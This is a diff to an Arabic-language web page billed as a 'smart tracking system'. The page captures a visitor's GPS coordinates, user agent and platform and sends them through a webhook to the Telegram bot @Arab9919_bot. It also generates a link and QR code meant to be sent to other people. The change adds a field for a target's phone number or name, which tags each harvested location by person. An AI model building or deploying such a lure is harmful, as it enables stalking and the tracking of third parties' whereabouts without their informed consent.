@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🚀 نظام التتبع الذكي - موقعك الحقيقي</title>
     <style>
+        /* جميع الأنماط السابقة تبقى كما هي */
         * {
             margin: 0;
             padding: 0;
@@ -287,6 +288,42 @@
             margin: 20px 0;
             word-break: break-all;
         }
+
+        /* إضافة نمط لحقل الإدخال الجديد */
+        .custom-id-input {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .custom-id-input label {
+            color: #88ffcc;
+            font-size: 1.1em;
+        }
+
+        .custom-id-input input {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #00ff88;
+            border-radius: 10px;
+            padding: 12px 20px;
+            color: white;
+            width: 300px;
+            max-width: 90%;
+            text-align: center;
+            font-size: 16px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .custom-id-input input::placeholder {
+            color: #88ffcc;
+            opacity: 0.7;
+        }
+
+        .custom-id-input button {
+            margin-top: 10px;
+        }
         
         @media (max-width: 768px) {
             .container {
@@ -308,6 +345,10 @@
             
             .barcode-actions {
                 flex-direction: column;
+            }
+
+            .custom-id-input input {
+                width: 90%;
             }
         }
     </style>
@@ -384,6 +425,16 @@
         <!-- قسم الباركود -->
         <div class="qr-section">
             <h3><i class="fas fa-qrcode"></i> باركود رابط التتبع</h3>
+            
+            <!-- حقل إدخال مخصص للإسم أو الرقم -->
+            <div class="custom-id-input">
+                <label for="customId">أدخل رقم أو اسم للرابط (اختياري):</label>
+                <input type="text" id="customId" placeholder="مثال: 00966512345678 أو أحمد" maxlength="50">
+                <button class="btn" onclick="updateTrackUrlWithCustomId()">
+                    <i class="fas fa-sync-alt"></i> تحديث الرابط بالاسم المخصص
+                </button>
+            </div>
+            
             <p>انسخ الرابط أو استخدم الباركود لإرساله لأي شخص:</p>
             
             <div class="code-box" id="systemUrl">https://موقعك.com/track</div>
@@ -426,7 +477,8 @@
                 <p>2. اسمح للمتصفح بالوصول إلى موقعك</p>
                 <p>3. انتظر حتى يحصل النظام على إشارة GPS</p>
                 <p>4. اضغط على "إرسال للبوت"</p>
-                <p>5. استخدم الباركود لمشاركة الرابط</p>
+                <p>5. أدخل رقم أو اسم (اختياري) لتخصيص رابط التتبع</p>
+                <p>6. استخدم الباركود لمشاركة الرابط</p>
             </div>
             
             <div class="card">
@@ -448,6 +500,7 @@
         // متغيرات النظام
         let currentLocation = null;
         let trackUrl = '';
+        let customId = '';
         
         // عناصر DOM
         const getLocationBtn = document.getElementById('getLocationBtn');
@@ -522,12 +575,41 @@
         
         // إنشاء رابط التتبع
         function generateTrackUrl(lat, lon) {
-            const userId = Math.random().toString(36).substr(2, 9);
-            trackUrl = `${window.location.origin}/track/${userId}?lat=${lat.toFixed(6)}&lon=${lon.toFixed(6)}`;
+            // الحصول على المعرف المخصص إذا تم إدخاله، وإلا استخدم معرف عشوائي
+            const customIdInput = document.getElementById('customId');
+            let userId = customIdInput.value.trim();
+            
+            if (!userId) {
+                userId = Math.random().toString(36).substr(2, 9);
+            } else {
+                // تنظيف المعرف المخصص: إزالة المسافات وتحويله إلى نص آمن للرابط
+                userId = userId.replace(/\s+/g, '_');
+            }
+            
+            trackUrl = `${window.location.origin}/track/${encodeURIComponent(userId)}?lat=${lat.toFixed(6)}&lon=${lon.toFixed(6)}`;
             document.getElementById('systemUrl').textContent = trackUrl;
             
             // إنشاء الباركود
             generateBarcode(trackUrl);
+            
+            // حفظ المعرف المخصص
+            customId = userId;
+        }
+        
+        // تحديث الرابط باستخدام المعرف المخصص (دون تغيير الإحداثيات)
+        function updateTrackUrlWithCustomId() {
+            if (!currentLocation) {
+                alert('⚠️ يرجى تحديد موقعك أولاً للحصول على إحداثيات');
+                return;
+            }
+            
+            const lat = currentLocation.coords.latitude;
+            const lon = currentLocation.coords.longitude;
+            
+            // إعادة إنشاء الرابط مع المعرف المخصص
+            generateTrackUrl(lat, lon);
+            
+            alert('✅ تم تحديث الرابط بالاسم المخصص بنجاح!');
         }
         
         // إنشاء الباركود
@@ -684,7 +766,8 @@
                     source: 'gps_direct',
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
-                    url: window.location.href
+                    url: trackUrl,
+                    customId: customId
                 };
                 
                 // إرسال البيانات للبوت عبر Webhook
@@ -700,6 +783,7 @@
 🎯 **الدقة:** ${Math.round(locationData.accuracy)} متر
 📡 **المصدر:** ${locationData.source}
 ⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
+👤 **المعرف:** ${locationData.customId}
 🌐 **الرابط:** ${locationData.url}
 📱 **الجهاز:** ${locationData.userAgent.substring(0, 100)}...
 
@@ -766,7 +850,7 @@
                 
                 const pngFile = canvas.toDataURL('image/png');
                 const downloadLink = document.createElement('a');
-                downloadLink.download = 'barcode-tracker.png';
+                downloadLink.download = `barcode-${customId || 'tracker'}.png`;
                 downloadLink.href = pngFile;
                 downloadLink.click();
             };
@@ -844,6 +928,7 @@
         📍 نفس التصميم السابق بالضبط
         ⚡ GPS مباشر + باركورد للمشاركة
         🎯 إرسال مباشر للبوت @Arab9919_bot
+        👤 دعم الأسماء المخصصة للروابط
         ========================================
         `);
     </script>
